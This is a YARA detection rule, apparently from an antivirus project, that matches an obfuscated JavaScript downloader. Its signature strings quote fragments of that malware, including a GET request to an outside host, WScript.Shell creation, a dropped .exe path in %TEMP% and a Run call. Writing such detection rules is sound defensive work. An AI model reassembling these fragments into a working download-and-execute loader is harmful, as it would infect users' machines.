rule sig_20160330_aa3d476a3fa4d928c2c0e2f9cc29e262 {
  meta:
    description = "datamaliciousorder - file 20160330_aa3d476a3fa4d928c2c0e2f9cc29e262.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "125be12ad78e76f5d8bb5d28e49c7a978fa7f891b5c3e163e2b281423181b9ca"

  strings:
    $s1  = "function YR(AC, B){XS = XS * 1; return AC - B;};" fullword ascii
    $s2  = "PB[XR](\"GET\", \"http://vidamparty.hu/as0ldr\", false);" fullword ascii
    $s3  = "var A = function ND() {return WScript[L](\"WScript\"+\".Shell\");}(), Y0 = 11;" fullword ascii
    $s4  = "if (PB[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function IQ(){return X + \"\";};" fullword ascii
    $s6  = "function SD() {return A[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"bbx6GRSzMQYAnsX.ex\" + \"e\";};" fullword ascii
    $s7  = "function O() {return ((GG == true) && (GG == S)) ? 1 : XS;};" fullword ascii
    $s8  = "function WN(E){A[\"Run\"](E, XS, XS);};" fullword ascii
    $s9  = "function Z()" fullword ascii
    $s10 = "function KJ(){return L;};" fullword ascii
    $s11 = "var QG = new this[\"Date\"]();" fullword ascii
    $s12 = "return YR(LH, EY);" fullword ascii
    $s13 = "}while (JN);" fullword ascii
    $s14 = "function DI(){return 22;};" fullword ascii
    $s15 = "function U(Z0) {var OR = (1, 2, 3, 4, 5, Z0); return OR;};" fullword ascii
    $s16 = "var S = false;" fullword ascii
    $s17 = "S = true; " fullword ascii
    $s18 = "var AT = false;" fullword ascii
    $s19 = "GG = true; " fullword ascii
    $s20 = "var GG = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}